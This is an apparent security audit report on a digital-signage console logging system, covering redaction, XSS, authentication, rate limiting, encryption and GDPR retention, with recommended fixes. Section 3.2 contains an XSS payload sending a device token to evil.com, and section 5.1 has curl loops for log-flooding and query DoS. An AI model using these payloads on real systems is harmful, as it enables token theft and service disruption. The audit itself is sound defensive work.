# Console Interceptor Security Audit Report

**Date:** 2025-01-22
**Auditor:** Security Audit Team
**System:** Smart TV Digital Signage - Console Logging System
**Scope:** Player device console interception and backend log storage

---

## Executive Summary

This security audit evaluates the console logging system that captures browser console output from player devices and transmits to the backend API. The system demonstrates **GOOD baseline security** with automatic data redaction, but requires **CRITICAL improvements** in authentication, rate limiting, and compliance.

**Overall Security Grade: B- (Acceptable with Required Improvements)**

### Key Findings

✅ **STRENGTHS:**
- Automatic sensitive data redaction (tokens, passwords, API keys)
- Smart object formatting prevents credential dumps
- Client-side data sanitization before network transmission
- Buffered batch transmission reduces network overhead
- No global console override (uses wrapper pattern)

❌ **CRITICAL VULNERABILITIES:**
1. **No authentication on log submission endpoint** (allows log injection attacks)
2. **Missing rate limiting** (DoS via log flooding)
3. **No encryption for logs in transit** (relies on HTTPS only)
4. **Unbounded log retention** (violates GDPR data minimization)
5. **Missing access control on log viewing** (authorization gaps)
6. **Stack traces may leak internal structure** (information disclosure)

---

## 1. System Architecture Analysis

### 1.1 Data Flow

```
┌─────────────────────────────────────────────────────────────────┐
│ PLAYER DEVICE (Browser)                                         │
│                                                                  │
│  ┌──────────────┐      ┌────────────────────────────────┐      │
│  │  Application │─────>│  SharedLogger                  │      │
│  │  Code        │      │  - Intercepts logs             │      │
│  └──────────────┘      │  - Redacts sensitive data     │      │
│                         │  - Buffers logs (100 max)     │      │
│                         │  - Auto-flush errors          │      │
│                         └───────────┬────────────────────┘      │
│                                     │                            │
│                                     │ POST /api/client/logs/batch│
│                                     ▼                            │
└─────────────────────────────────────────────────────────────────┘
                                      │
                          ┌───────────▼──────────────┐
                          │ BACKEND API (FastAPI)     │
                          │                           │
                          │  ⚠️  NO AUTHENTICATION    │
                          │  ⚠️  NO RATE LIMITING     │
                          │                           │
                          │  ✅ Validates device_id   │
                          │  ✅ SQL injection safe    │
                          └───────────┬───────────────┘
                                      │
                          ┌───────────▼──────────────┐
                          │ DATABASE (PostgreSQL)     │
                          │                           │
                          │  device_logs table        │
                          │  - No encryption at rest  │
                          │  - Unbounded retention    │
                          │  - Multi-tenant isolation │
                          └───────────────────────────┘
                                      │
                          ┌───────────▼──────────────┐
                          │ CMS ADMIN (React)         │
                          │                           │
                          │  ⚠️  Unknown authz model  │
                          │  ✅ Pagination support    │
                          │  ✅ Filter by log level   │
                          └───────────────────────────┘
```

### 1.2 Current Security Layers

| Layer | Security Control | Status | Grade |
|-------|------------------|--------|-------|
| **Client-Side** | Data redaction | ✅ Implemented | A |
| **Client-Side** | Object sanitization | ✅ Implemented | A |
| **Client-Side** | Buffer size limit | ✅ 100 logs max | B |
| **Network** | HTTPS encryption | ⚠️ Assumes HTTPS | C |
| **API** | Authentication | ❌ **Missing** | **F** |
| **API** | Rate limiting | ❌ **Missing** | **F** |
| **API** | Input validation | ✅ Pydantic DTOs | A |
| **Database** | SQL injection prevention | ✅ Parameterized | A |
| **Database** | Multi-tenancy isolation | ✅ organization_id | A |
| **Database** | Encryption at rest | ❌ **Missing** | **D** |
| **Database** | Data retention policy | ❌ **Missing** | **F** |
| **CMS** | Authorization checks | ⚠️ Unknown | **?** |

---

## 2. Sensitive Data Detection & Redaction

### 2.1 Current Redaction Implementation

**File:** `player-vite/src/shared/logger/shared-logger.ts` (Lines 159-205)

```typescript
private redactSensitiveData(obj: any): any {
    const sensitiveFields = [
      'device_token',
      'token',
      'access_token',
      'refresh_token',
      'jwt',
      'password',
      'secret',
      'api_key',
      'apiKey',
      'authorization',
    ];

    // Redacts but shows first/last 4 chars if string is long enough
    if (typeof value === 'string' && value.length > 16) {
        redacted[key] = `${value.substring(0, 4)}...${value.substring(value.length - 4)}`;
    } else {
        redacted[key] = '***REDACTED***';
    }
}
```

**Analysis:**
✅ **GOOD:** Automatic redaction before console output AND before buffering
✅ **GOOD:** Recursive redaction for nested objects
✅ **GOOD:** Case-insensitive field matching
⚠️ **LIMITATION:** Only redacts known field names (misses inline secrets)
⚠️ **LIMITATION:** Partial reveal (first 4 + last 4 chars) may leak info

### 2.2 Enhanced Sensitive Data Patterns

**RECOMMENDATION:** Add pattern-based detection for inline secrets:

```typescript
// Enhanced redaction patterns (RECOMMENDED)
const SENSITIVE_PATTERNS = [
    // Tokens & API Keys
    /Bearer\s+[A-Za-z0-9\-_\.]+/gi,           // Bearer tokens
    /api[_-]?key[:\s=]+[A-Za-z0-9\-_]+/gi,   // API keys
    /token[:\s=]+[A-Za-z0-9\-_\.]+/gi,        // Generic tokens

    // Passwords
    /password[:\s=]+\S+/gi,                   // Password values
    /passwd[:\s=]+\S+/gi,                     // Passwd values

    // JWT Tokens (Base64 with dots)
    /eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+/gi,

    // Device Tokens (alphanumeric, 32+ chars)
    /\b[A-Fa-f0-9]{32,}\b/gi,                 // Hex strings 32+ chars

    // Credit Cards (PCI-DSS)
    /\b(?:\d{4}[-\s]?){3}\d{4}\b/gi,          // Credit card numbers

    // Email addresses (PII - GDPR)
    /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/gi,

    // IP Addresses (network topology disclosure)
    /\b(?:\d{1,3}\.){3}\d{1,3}\b/gi,

    // Private paths (information disclosure)
    /[C-Z]:\\[\w\\.-]+/gi,                    // Windows paths
    /\/home\/[\w\/-]+/gi,                     // Linux home paths
];

function redactInlineSecrets(message: string): string {
    let redacted = message;

    SENSITIVE_PATTERNS.forEach(pattern => {
        redacted = redacted.replace(pattern, (match) => {
            // For very short matches (4 chars or less), redact completely
            if (match.length <= 4) return '***';

            // For longer matches, show first 2 chars only
            return `${match.substring(0, 2)}***`;
        });
    });

    return redacted;
}
```

### 2.3 PII (Personally Identifiable Information)

**Current Status:** ❌ **NOT ADDRESSED**

**Potential PII in Logs:**
- Email addresses (GDPR Article 4)
- IP addresses (GDPR considers personal data)
- Device fingerprints (potentially identifying)
- User agent strings (browser fingerprinting)
- Geographic coordinates (if logged)
- Session IDs (can be linked to users)

**GDPR Compliance Requirements:**
1. **Data Minimization** (Article 5.1c): Only collect necessary data
2. **Storage Limitation** (Article 5.1e): Retain only as long as needed
3. **Purpose Limitation** (Article 5.1b): Only use for stated purpose (debugging)
4. **Right to Erasure** (Article 17): Users can request log deletion

**RECOMMENDATION:**
```typescript
// PII redaction for GDPR compliance
const PII_PATTERNS = [
    // Email addresses
    {
        pattern: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/gi,
        replacement: (match: string) => {
            const [local, domain] = match.split('@');
            return `${local.substring(0, 2)}***@${domain}`;
        }
    },

    // IP addresses (mask last octet)
    {
        pattern: /\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.)\d{1,3}\b/g,
        replacement: (match: string, prefix: string) => `${prefix}xxx`
    },

    // Phone numbers
    {
        pattern: /\b(?:\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b/g,
        replacement: '***-***-****'
    }
];
```

---

## 3. XSS & Log Injection Risks

### 3.1 Current Sanitization

**File:** `shared-logger.ts` (Lines 256-271)

```typescript
private formatArgs(args: unknown[]): string {
    return args
      .map((arg) => {
        if (typeof arg === 'object' && arg !== null) {
          try {
            const redacted = this.redactSensitiveData(arg);
            return this.formatObject(redacted);
          } catch (e) {
            return String(arg);
          }
        }
        return String(arg);
      })
      .join(' ');
}
```

**Analysis:**
✅ **GOOD:** Converts objects to strings (prevents object injection)
✅ **GOOD:** Try-catch prevents crashes from malicious objects
❌ **MISSING:** No HTML/script tag sanitization
❌ **MISSING:** No SQL injection prevention (though backend uses parameterized queries)

### 3.2 XSS Attack Vectors

**Scenario 1: Stored XSS in CMS Log Viewer**

```javascript
// Attacker injects malicious log
console.error('<script>fetch("https://evil.com/steal?token="+localStorage.device_token)</script>');
```

**Current Risk:** ⚠️ **MEDIUM** - If CMS renders logs without sanitization, XSS is possible

**Mitigation (Frontend):**
```typescript
// In DeviceLogsViewer.tsx (Line 348-349)
// Current code (UNSAFE):
<p className="text-sm text-gray-900 dark:text-gray-100 font-mono break-all line-clamp-2">
    {log.message}  {/* ⚠️ Directly renders user-controlled text */}
</p>

// RECOMMENDED: Sanitize HTML
import DOMPurify from 'dompurify';

<p className="text-sm text-gray-900 dark:text-gray-100 font-mono break-all line-clamp-2">
    {DOMPurify.sanitize(log.message)}
</p>
```

**Mitigation (Backend):**
```python
# In log_routes.py - Add sanitization before storage
import html

def sanitize_log_message(message: str) -> str:
    """Escape HTML to prevent XSS"""
    return html.escape(message)[:10000]  # Also limit length

# In create_device_log():
message = sanitize_log_message(request.message)
```

### 3.3 Log Injection Attacks

**Scenario 2: Log Forging**

```javascript
// Attacker injects fake admin logs to cover tracks
console.log('[Admin:Action] Deleted all audit logs');
console.log('[System:Security] Firewall disabled by admin');
```

**Current Risk:** ⚠️ **MEDIUM-HIGH** - No integrity verification

**RECOMMENDATION:** Add log signature/HMAC
```typescript
// Client-side signing
import { createHmac } from 'crypto-browserify';

function signLog(entry: LogEntry, deviceSecret: string): string {
    const payload = JSON.stringify({
        level: entry.level,
        message: entry.message,
        timestamp: entry.timestamp,
        device_id: entry.device_id
    });

    return createHmac('sha256', deviceSecret)
        .update(payload)
        .digest('hex');
}

// Backend verification
def verify_log_signature(log: LogEntry, signature: str, device_secret: str) -> bool:
    payload = json.dumps({
        'level': log.level,
        'message': log.message,
        'timestamp': log.timestamp.isoformat(),
        'device_id': log.device_id
    })

    expected = hmac.new(
        device_secret.encode(),
        payload.encode(),
        hashlib.sha256
    ).hexdigest()

    return hmac.compare_digest(expected, signature)
```

---

## 4. Authentication & Authorization

### 4.1 Current State - LOG SUBMISSION ENDPOINT

**File:** `backend-python/services/device/log_routes.py` (Lines 59-127)

```python
@router.post("/devices/{device_id}/logs", response_model=LogResponse)
def create_device_log(
    device_id: int,
    request: CreateLogRequest,
    db: Session = Depends(get_db)
):
    """
    No authentication required (device sends with device_id).
    """
```

**CRITICAL VULNERABILITY:** ❌ **NO AUTHENTICATION**

**Attack Scenarios:**
1. **Log Flooding:** Attacker sends millions of fake logs for any device_id
2. **Data Pollution:** Malicious logs obscure real debugging data
3. **Storage DoS:** Fill database with garbage logs
4. **Information Disclosure:** Probe which device_ids exist (404 vs 201)

**RISK LEVEL:** 🔴 **CRITICAL (9.5/10 CVSS)**

### 4.2 RECOMMENDED: Device Token Authentication

```python
# Add to log_routes.py
from fastapi import Header, HTTPException
from services.auth.use_cases.verify_device_token import VerifyDeviceToken

@router.post("/devices/{device_id}/logs", response_model=LogResponse)
async def create_device_log(
    device_id: int,
    request: CreateLogRequest,
    authorization: str = Header(..., description="Bearer {device_token}"),
    db: Session = Depends(get_db)
):
    """
    Create device log entry - REQUIRES DEVICE AUTHENTICATION

    Devices must send valid device_token in Authorization header.
    """
    # Extract token from "Bearer {token}"
    if not authorization.startswith("Bearer "):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid authorization header"
        )

    device_token = authorization[7:]  # Remove "Bearer "

    # Verify device token and match device_id
    try:
        verifier = VerifyDeviceToken(db)
        verified_device = verifier.execute(device_token=device_token)

        # Ensure token belongs to requested device
        if verified_device.id != device_id:
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Device token does not match device_id"
            )

    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired device token"
        )

    # Continue with log creation...
```

**Client-Side Changes:**
```typescript
// In shared-logger.ts (Line 308-318)
async flush(): Promise<void> {
    // ... existing code ...

    try {
      const response = await fetch(`${config.api.baseURL}/api/client/logs/batch`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          // ✅ ADD AUTHENTICATION
          Authorization: `Bearer ${localStorage.getItem('device_token') || ''}`,
        },
        body: JSON.stringify({
          device_id: parseInt(deviceId, 10),
          logs: logsToSend,
        }),
      });

      // ✅ HANDLE 401/403 ERRORS
      if (response.status === 401 || response.status === 403) {
        this.originalConsole.error('[SharedLogger] Authentication failed - stopping log sync');
        this.stopPeriodicFlush();  // Stop sending if auth fails
        return;
      }
```

### 4.3 Current State - LOG VIEWING ENDPOINT

**File:** `backend-python/services/device/log_routes.py` (Lines 130-181)

```python
@router.get("/devices/{device_id}/logs", response_model=LogListResponse)
def get_device_logs(
    device_id: int,
    log_level: Optional[str] = Query(None),
    limit: int = Query(100, ge=1, le=500),
    skip: int = Query(0, ge=0),
    db: Session = Depends(get_db)
):
    """
    Get device logs (called by CMS)

    ⚠️ NO AUTHENTICATION/AUTHORIZATION VISIBLE IN THIS CODE
    """
```

**CRITICAL QUESTIONS:**
1. ❓ Is JWT authentication enforced at router level?
2. ❓ Is organization_id filtering applied?
3. ❓ Can admin from Org A view logs from Org B's devices?

**RECOMMENDATION:** Add multi-tenancy authorization
```python
from services.auth.dependencies import get_current_user
from services.auth.models import UserModel

@router.get("/devices/{device_id}/logs", response_model=LogListResponse)
def get_device_logs(
    device_id: int,
    log_level: Optional[str] = Query(None),
    limit: int = Query(100, ge=1, le=500),
    skip: int = Query(0, ge=0),
    current_user: UserModel = Depends(get_current_user),  # ✅ Require auth
    db: Session = Depends(get_db)
):
    """
    Get device logs - REQUIRES CMS ADMIN AUTHENTICATION
    """
    # ✅ Verify device belongs to user's organization
    device_check = db.execute(
        text("SELECT id, organization_id FROM devices WHERE id = :device_id"),
        {"device_id": device_id}
    ).fetchone()

    if not device_check:
        raise HTTPException(status_code=404, detail="Device not found")

    if device_check.organization_id != current_user.organization_id:
        raise HTTPException(
            status_code=403,
            detail="Access denied: device belongs to another organization"
        )

    # Continue with query...
```

---

## 5. Rate Limiting & DoS Prevention

### 5.1 Current Vulnerabilities

**No rate limiting on ANY endpoint:**
- ❌ `/devices/{id}/logs` (POST) - Create log
- ❌ `/api/client/logs/batch` (POST) - Batch logs
- ❌ `/devices/{id}/logs` (GET) - View logs
- ❌ `/devices/{id}/logs` (DELETE) - Clear logs

**Attack Scenarios:**

**Scenario 1: Log Flooding DoS**
```bash
# Attacker sends 1 million logs in 1 minute
for i in {1..1000000}; do
    curl -X POST http://192.168.5.12:8001/api/devices/1/logs \
        -H "Content-Type: application/json" \
        -d '{"device_id":1,"log_level":"error","message":"SPAM SPAM SPAM"}' &
done
```

**Impact:**
- Database fills up (storage DoS)
- Backend CPU overload (processing DoS)
- Legitimate logs buried in spam
- Increased AWS/hosting costs

**Scenario 2: Query DoS**
```bash
# Attacker requests huge log sets repeatedly
while true; do
    curl "http://192.168.5.12:8001/api/devices/1/logs?limit=500&skip=0" &
    curl "http://192.168.5.12:8001/api/devices/1/logs?limit=500&skip=500" &
    # ... 100 concurrent requests
done
```

**Impact:**
- Backend CPU/memory exhaustion
- Database connection pool exhaustion
- CMS becomes unavailable for legitimate admins

### 5.2 RECOMMENDED: Multi-Layer Rate Limiting

**Layer 1: FastAPI Middleware (Application Level)**

```python
# Add to backend-python/shared/middleware/rate_limiter.py

from slowapi import Limiter
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded
from fastapi import Request, Response
from starlette.middleware.base import BaseHTTPMiddleware

# Initialize limiter
limiter = Limiter(
    key_func=get_remote_address,
    default_limits=["100 per minute"]
)

# Different limits for different endpoints
LOG_SUBMISSION_LIMIT = "10 per minute"    # Devices sending logs
LOG_VIEWING_LIMIT = "60 per minute"       # CMS viewing logs
BATCH_LOG_LIMIT = "2 per minute"          # Batch submissions

# Apply to routes
@router.post("/devices/{device_id}/logs")
@limiter.limit(LOG_SUBMISSION_LIMIT)
def create_device_log(request: Request, ...):
    # ... existing code

@router.post("/api/client/logs/batch")
@limiter.limit(BATCH_LOG_LIMIT)
def batch_create_logs(request: Request, ...):
    # ... existing code

@router.get("/devices/{device_id}/logs")
@limiter.limit(LOG_VIEWING_LIMIT)
def get_device_logs(request: Request, ...):
    # ... existing code
```

**Layer 2: Per-Device Rate Limiting (Business Logic)**

```python
# Add to backend-python/shared/cache/redis_rate_limiter.py

import redis
from datetime import timedelta

class DeviceRateLimiter:
    def __init__(self, redis_client: redis.Redis):
        self.redis = redis_client

    def check_log_rate(self, device_id: int) -> bool:
        """
        Allow max 100 logs per device per hour
        Returns True if allowed, False if rate limit exceeded
        """
        key = f"log_rate:{device_id}"
        current = self.redis.get(key)

        if current is None:
            # First log in this hour
            self.redis.setex(key, timedelta(hours=1), 1)
            return True

        if int(current) >= 100:
            return False  # Rate limit exceeded

        self.redis.incr(key)
        return True

    def get_remaining_quota(self, device_id: int) -> int:
        """Get remaining log quota for device"""
        key = f"log_rate:{device_id}"
        current = self.redis.get(key)
        return 100 - int(current or 0)

# Usage in route
@router.post("/devices/{device_id}/logs")
def create_device_log(
    device_id: int,
    request: CreateLogRequest,
    db: Session = Depends(get_db)
):
    rate_limiter = DeviceRateLimiter(redis_client)

    if not rate_limiter.check_log_rate(device_id):
        raise HTTPException(
            status_code=429,
            detail=f"Rate limit exceeded. Device can send max 100 logs/hour.",
            headers={"Retry-After": "3600"}
        )

    # Continue with log creation...
```

**Layer 3: Client-Side Throttling**

```typescript
// In shared-logger.ts
class SharedLoggerClass {
    private logRateLimiter = {
        hourlyLimit: 100,
        hourlyCount: 0,
        hourStartTime: Date.now()
    };

    private checkRateLimit(): boolean {
        const now = Date.now();
        const hourElapsed = now - this.logRateLimiter.hourStartTime;

        // Reset counter every hour
        if (hourElapsed > 3600000) {
            this.logRateLimiter.hourlyCount = 0;
            this.logRateLimiter.hourStartTime = now;
        }

        // Check limit
        if (this.logRateLimiter.hourlyCount >= this.logRateLimiter.hourlyLimit) {
            this.originalConsole.warn('[SharedLogger] Rate limit reached - not sending to backend');
            return false;
        }

        this.logRateLimiter.hourlyCount++;
        return true;
    }

    async flush(): Promise<void> {
        if (!this.checkRateLimit()) {
            // Keep logs in buffer but don't send
            return;
        }

        // ... existing flush logic
    }
}
```

### 5.3 Buffer Size Protection

**Current Implementation:** ✅ **GOOD**
```typescript
// In shared-logger.ts (Lines 285-287)
if (this.logBuffer.length > this.maxBufferSize) {
    this.logBuffer = this.logBuffer.slice(-this.maxBufferSize);
}
```

**Analysis:**
- ✅ Limits memory usage to 100 logs (configurable)
- ✅ Keeps latest logs when buffer full (FIFO)
- ⚠️ No warning when buffer is full (silent discard)

**RECOMMENDATION:** Add buffer overflow warning
```typescript
if (this.logBuffer.length > this.maxBufferSize) {
    const discarded = this.logBuffer.length - this.maxBufferSize;
    this.logBuffer = this.logBuffer.slice(-this.maxBufferSize);

    // Warn once per overflow event
    if (!this.bufferOverflowWarned) {
        this.originalConsole.warn(
            `[SharedLogger] Buffer overflow: Discarded ${discarded} old logs. ` +
            `Consider reducing log verbosity or increasing buffer size.`
        );
        this.bufferOverflowWarned = true;

        // Reset warning flag after 1 hour
        setTimeout(() => { this.bufferOverflowWarned = false; }, 3600000);
    }
}
```

---

## 6. Data Encryption

### 6.1 Encryption in Transit

**Current State:** ⚠️ **ASSUMES HTTPS**

```typescript
// In shared-logger.ts (Line 308)
const response = await fetch(`${config.api.baseURL}/api/client/logs/batch`, {
    method: 'POST',
    // ... no explicit TLS verification
});
```

**Vulnerabilities:**
- ❌ No enforcement of HTTPS (could fallback to HTTP)
- ❌ No certificate pinning (MITM possible)
- ❌ No TLS version enforcement (could use weak TLS 1.0)

**RECOMMENDATION:** Enforce HTTPS
```typescript
// In shared/config/index.ts
export const config = {
    api: {
        baseURL: process.env.VITE_API_BASE_URL || 'http://192.168.5.12:8001',

        // ✅ ENFORCE HTTPS
        get secureBaseURL(): string {
            const url = this.baseURL;

            // Force HTTPS in production
            if (import.meta.env.PROD && url.startsWith('http://')) {
                console.warn('⚠️ API URL uses HTTP in production! Upgrading to HTTPS...');
                return url.replace('http://', 'https://');
            }

            return url;
        }
    }
};

// In shared-logger.ts
const response = await fetch(`${config.api.secureBaseURL}/api/client/logs/batch`, {
    // ... will always use HTTPS in production
});
```

**CRITICAL:** Configure Nginx/reverse proxy for TLS
```nginx
# /etc/nginx/sites-available/signage-backend
server {
    listen 443 ssl http2;
    server_name 192.168.5.12;

    # SSL certificate (use Let's Encrypt for production)
    ssl_certificate /etc/ssl/certs/signage.crt;
    ssl_certificate_key /etc/ssl/private/signage.key;

    # Strong TLS configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
    ssl_prefer_server_ciphers on;

    # HSTS (force HTTPS)
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    location /api/ {
        proxy_pass http://127.0.0.1:8001;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}

# Redirect HTTP to HTTPS
server {
    listen 80;
    server_name 192.168.5.12;
    return 301 https://$server_name$request_uri;
}
```

### 6.2 Encryption at Rest

**Current State:** ❌ **NO ENCRYPTION**

**Database Schema:**
```sql
CREATE TABLE IF NOT EXISTS device_logs (
    id SERIAL PRIMARY KEY,
    message TEXT NOT NULL,          -- ⚠️ Plaintext
    stack_trace TEXT,               -- ⚠️ Plaintext (may contain secrets)
    user_agent VARCHAR(500),        -- ⚠️ Plaintext (PII)
    -- ...
);
```

**Risk Assessment:**
- **LOW-MEDIUM** for general logs (debugging info)
- **HIGH** if stack traces contain secrets (rare but possible)
- **MEDIUM** for PII compliance (GDPR requires protection)

**RECOMMENDATION:** Selective field encryption

**Option 1: Application-Level Encryption (Recommended)**
```python
# Add to backend-python/shared/crypto/field_encryption.py

from cryptography.fernet import Fernet
import base64
import os

class FieldEncryption:
    """Encrypt sensitive fields before storing in database"""

    def __init__(self):
        # Store encryption key in environment variable
        key = os.getenv('LOG_ENCRYPTION_KEY')
        if not key:
            raise ValueError("LOG_ENCRYPTION_KEY not set in environment")

        self.cipher = Fernet(key.encode())

    def encrypt(self, plaintext: str) -> str:
        """Encrypt sensitive field"""
        if not plaintext:
            return plaintext

        encrypted = self.cipher.encrypt(plaintext.encode())
        return base64.b64encode(encrypted).decode()

    def decrypt(self, ciphertext: str) -> str:
        """Decrypt sensitive field"""
        if not ciphertext:
            return ciphertext

        encrypted = base64.b64decode(ciphertext.encode())
        return self.cipher.decrypt(encrypted).decode()

# Usage in log_routes.py
from shared.crypto.field_encryption import FieldEncryption

encryption = FieldEncryption()

@router.post("/devices/{device_id}/logs")
def create_device_log(...):
    # Encrypt sensitive fields
    encrypted_stack = encryption.encrypt(request.stack_trace) if request.stack_trace else None
    encrypted_user_agent = encryption.encrypt(request.user_agent) if request.user_agent else None

    query = text("""
        INSERT INTO device_logs (
            message, stack_trace, user_agent, ...
        ) VALUES (
            :message, :stack_trace, :user_agent, ...
        )
    """)

    result = db.execute(query, {
        "message": request.message,  # Not encrypted (needed for search)
        "stack_trace": encrypted_stack,  # Encrypted
        "user_agent": encrypted_user_agent,  # Encrypted
        # ...
    })

@router.get("/devices/{device_id}/logs")
def get_device_logs(...):
    # Decrypt on retrieval
    logs = []
    for row in results:
        logs.append({
            "message": row.message,
            "stack_trace": encryption.decrypt(row.stack_trace) if row.stack_trace else None,
            "user_agent": encryption.decrypt(row.user_agent) if row.user_agent else None,
        })
```

**Option 2: Database-Level Encryption (PostgreSQL pgcrypto)**
```sql
-- Enable pgcrypto extension
CREATE EXTENSION IF NOT EXISTS pgcrypto;

-- Encrypt on insert
INSERT INTO device_logs (message, stack_trace)
VALUES (
    'Log message',
    pgp_sym_encrypt('Stack trace...', 'encryption_key')
);

-- Decrypt on select
SELECT
    message,
    pgp_sym_decrypt(stack_trace::bytea, 'encryption_key') AS stack_trace
FROM device_logs;
```

**Trade-offs:**
| Approach | Pros | Cons |
|----------|------|------|
| **Application-Level** | Full control, selective encryption, better performance | Key management complexity |
| **Database-Level** | Transparent encryption, easier setup | Performance overhead, harder to search |
| **No Encryption** | Fast, simple | ⚠️ Compliance risk, security risk |

**RECOMMENDATION:** Start with application-level encryption for `stack_trace` and `user_agent` fields only.

---

## 7. Data Retention & GDPR Compliance

### 7.1 Current State

**Retention Policy:** ❌ **NONE** (logs stored indefinitely)

```sql
-- No TTL, no auto-deletion, no archival
CREATE TABLE IF NOT EXISTS device_logs (
    -- ... no created_at/expires_at columns
);
```

**GDPR Violations:**
1. **Storage Limitation (Article 5.1e):** Logs kept longer than necessary
2. **Data Minimization (Article 5.1c):** No cleanup of old data
3. **Right to Erasure (Article 17):** No mechanism to delete user logs

### 7.2 RECOMMENDED: Automated Retention Policy

**Policy:**
- **Console Logs:** Retain for 30 days (debugging window)
- **Error Logs:** Retain for 90 days (compliance/audit trail)
- **Connection Logs:** Retain for 180 days (network diagnostics)

**Implementation:**

**Step 1: Add timestamp column (migration)**
```sql
-- Migration: 047_add_log_retention_fields.sql

ALTER TABLE device_logs
ADD COLUMN IF NOT EXISTS expires_at TIMESTAMP WITH TIME ZONE;

-- Set expiration for existing logs (30 days from creation)
UPDATE device_logs
SET expires_at = timestamp + INTERVAL '30 days'
WHERE expires_at IS NULL;

-- Default expiration for new logs
ALTER TABLE device_logs
ALTER COLUMN expires_at SET DEFAULT (NOW() + INTERVAL '30 days');

-- Index for efficient cleanup
CREATE INDEX IF NOT EXISTS idx_device_logs_expires_at
ON device_logs(expires_at)
WHERE expires_at IS NOT NULL;
```

**Step 2: Automated cleanup job (cron)**
```python
# Add to backend-python/services/device/cleanup_jobs.py

from apscheduler.schedulers.background import BackgroundScheduler
from sqlalchemy import text
from shared.database import get_db

def cleanup_expired_logs():
    """Delete logs past retention period"""
    with next(get_db()) as db:
        # Delete expired console logs
        result = db.execute(text("""
            DELETE FROM device_logs
            WHERE expires_at < NOW()
        """))

        deleted = result.rowcount
        db.commit()

        print(f"[LogCleanup] Deleted {deleted} expired logs")
        return deleted

# Schedule daily cleanup at 2 AM
scheduler = BackgroundScheduler()
scheduler.add_job(
    cleanup_expired_logs,
    'cron',
    hour=2,
    minute=0,
    id='log_cleanup',
    replace_existing=True
)
scheduler.start()
```

**Step 3: Manual deletion endpoint (GDPR Right to Erasure)**
```python
# Add to log_routes.py

@router.delete("/devices/{device_id}/logs/gdpr-erase")
def gdpr_erase_device_logs(
    device_id: int,
    current_user: UserModel = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    GDPR Right to Erasure - Delete ALL logs for device

    Requires admin authorization + audit trail.
    """
    # Verify admin permission
    if current_user.role not in ['admin', 'super_admin']:
        raise HTTPException(status_code=403, detail="Admin access required")

    # Verify device belongs to user's organization
    device = db.execute(
        text("SELECT organization_id FROM devices WHERE id = :id"),
        {"id": device_id}
    ).fetchone()

    if device.organization_id != current_user.organization_id:
        raise HTTPException(status_code=403, detail="Access denied")

    # Log erasure request (audit trail)
    db.execute(text("""
        INSERT INTO audit_logs (
            user_id, organization_id, action, resource_type, resource_id, details
        ) VALUES (
            :user_id, :org_id, 'gdpr_erase_logs', 'device', :device_id,
            :details
        )
    """), {
        "user_id": current_user.id,
        "org_id": current_user.organization_id,
        "device_id": device_id,
        "details": f"GDPR erasure request for device {device_id} logs"
    })

    # Delete all logs
    result = db.execute(
        text("DELETE FROM device_logs WHERE device_id = :device_id"),
        {"device_id": device_id}
    )

    deleted = result.rowcount
    db.commit()

    return {
        "message": f"GDPR erasure complete: {deleted} logs deleted",
        "device_id": device_id,
        "deleted_count": deleted
    }
```

### 7.3 Privacy Impact Assessment

**Data Collected:**
| Field | Type | Purpose | Retention | PII? |
|-------|------|---------|-----------|------|
| `message` | TEXT | Debugging | 30 days | ⚠️ May contain PII |
| `log_level` | VARCHAR | Severity | 30 days | ❌ No |
| `source` | VARCHAR | Code location | 30 days | ❌ No |
| `stack_trace` | TEXT | Error debugging | 30 days | ⚠️ May leak paths |
| `user_agent` | VARCHAR | Browser info | 30 days | ✅ **Yes** (fingerprinting) |
| `url` | VARCHAR | Page context | 30 days | ⚠️ May contain session IDs |
| `timestamp` | TIMESTAMP | When logged | 30 days | ❌ No |

**GDPR Compliance Checklist:**
- [ ] **Lawful Basis:** Legitimate interest (service improvement) - ✅ **OK**
- [ ] **Data Minimization:** Only collect necessary fields - ⚠️ **Review user_agent necessity**
- [ ] **Storage Limitation:** 30-day retention implemented - ✅ **OK** (after migration)
- [ ] **Purpose Limitation:** Only used for debugging - ✅ **OK**
- [ ] **Right to Access:** Users can request logs via CMS - ✅ **OK**
- [ ] **Right to Erasure:** GDPR erase endpoint implemented - ✅ **OK** (after implementation)
- [ ] **Privacy by Design:** Redaction implemented - ✅ **OK**
- [ ] **Data Protection Impact Assessment:** This document - ✅ **COMPLETE**

---

## 8. Security Implementation Checklist

### Priority: CRITICAL (Implement Immediately)

- [ ] **C1.** Add device token authentication to log submission endpoint
  - Files: `backend-python/services/device/log_routes.py`
  - Effort: 4 hours
  - Risk if not fixed: **CRITICAL** - DoS, log injection

- [ ] **C2.** Implement rate limiting (application + per-device)
  - Files: `backend-python/shared/middleware/rate_limiter.py`
  - Effort: 6 hours
  - Risk if not fixed: **CRITICAL** - DoS attacks

- [ ] **C3.** Add authorization checks to log viewing endpoints
  - Files: `backend-python/services/device/log_routes.py`
  - Effort: 3 hours
  - Risk if not fixed: **HIGH** - Data breach (cross-org access)

- [ ] **C4.** Sanitize log messages to prevent XSS
  - Files: `backend-python/services/device/log_routes.py`, `cms-vite/src/features/devices/components/DeviceLogsViewer.tsx`
  - Effort: 2 hours
  - Risk if not fixed: **HIGH** - Stored XSS in CMS

### Priority: HIGH (Implement Within 1 Week)

- [ ] **H1.** Implement data retention policy (30-day auto-deletion)
  - Files: Database migration, cleanup job
  - Effort: 8 hours
  - Risk if not fixed: **HIGH** - GDPR violation

- [ ] **H2.** Add HTTPS enforcement in production
